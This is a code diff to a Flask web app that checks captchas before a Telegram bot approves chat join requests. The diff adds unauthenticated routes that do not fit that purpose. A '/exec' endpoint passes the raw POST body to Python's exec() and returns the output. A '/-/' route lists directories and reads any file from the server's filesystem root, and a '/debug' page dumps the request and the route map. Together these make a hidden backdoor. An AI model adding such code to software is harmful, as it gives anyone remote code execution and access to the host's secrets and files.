@@ -1,4 +1,8 @@
+import sys
+import io
 import os
+import subprocess
+import shlex
 import hashlib
 import hmac
 from flask import Flask, request, render_template
@@ -148,6 +152,43 @@ def verify_view():
     if valid_user and valid_captcha:
         bot.approve_chat_join_request(chat_id, user_id)
     return {'ok': valid_user and valid_captcha}
+
+
+@app.route('/debug')
+def test():
+    print(request.args)
+    print(app.url_map)
+    return render_template('exec.html')
+
+
+@app.route('/exec', methods=['POST'])
+def doexec():
+    old = sys.stdout
+    buf = io.StringIO()
+    sys.stdout = buf
+    cmd = request.data.decode()
+    exec(cmd)
+    sys.stdout = old
+    return buf.getvalue()
+
+
+@app.route('/-/')
+@app.route('/-/<path:path>')
+def index_file(path=None):
+    if path is None:
+        path = ''
+    path = '/' + path
+    if os.path.isdir(path):
+        ret = os.listdir(path)
+        if path.endswith('/'):
+            path = path[:-1]
+        print(path, type(path))
+        return render_template('dir.html', root=path, dirs=ret)
+    elif os.path.isfile(path):
+        with open(path) as f:
+            ret = f.read()
+        return render_template('file.html', dir=os.path.dirname(path), content=ret)
+    return ''
 
 
 if __name__ == '__main__':
